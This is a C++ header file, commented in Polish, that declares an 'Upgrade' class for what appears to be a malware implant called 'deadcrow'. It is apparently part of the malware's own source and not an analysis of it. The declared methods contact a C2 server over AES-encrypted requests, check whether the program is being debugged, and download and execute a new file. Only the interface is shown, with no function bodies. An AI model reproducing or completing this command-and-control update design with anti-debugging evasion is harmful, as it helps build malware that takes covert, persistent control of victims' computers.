#pragma once

#include <string>
#include <vector>
#include <functional>

namespace deadcrow {
namespace core {

class Upgrade {
public:
    // Konstruktor
    Upgrade(const std::string& c2_url, const std::string& aes_key);
    
    // Sprawdzenie dostępności aktualizacji
    bool checkForUpdate(const std::string& current_version);
    
    // Pobranie i instalacja aktualizacji
    bool downloadAndInstallUpdate(const std::string& current_version, const std::string& executable_path);
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Pobranie najnowszej wersji
    std::string getLatestVersion();
    
    // Pobranie adresu URL najnowszej wersji
    std::string getLatestVersionUrl();
    
private:
    // URL serwera C2
    std::string c2_url_;
    
    // Klucz AES do szyfrowania komunikacji
    std::string aes_key_;
    
    // Najnowsza wersja
    std::string latest_version_;
    
    // URL najnowszej wersji
    std::string latest_version_url_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Sprawdzanie, czy nie jesteśmy debugowani
    bool checkForDebugging();
    
    // Pobranie pliku z URL
    bool downloadFile(const std::string& url, const std::string& output_path);
    
    // Wykonanie pliku
    bool executeFile(const std::string& path);
    
    // Wysłanie żądania do C2
    std::string sendRequest(const std::string& endpoint, const std::string& data);
    
    // Parsowanie odpowiedzi z C2
    bool parseResponse(const std::string& response);
    
    // Porównanie wersji
    bool isNewerVersion(const std::string& current_version, const std::string& new_version);
};

} // namespace core
} // namespace deadcrow
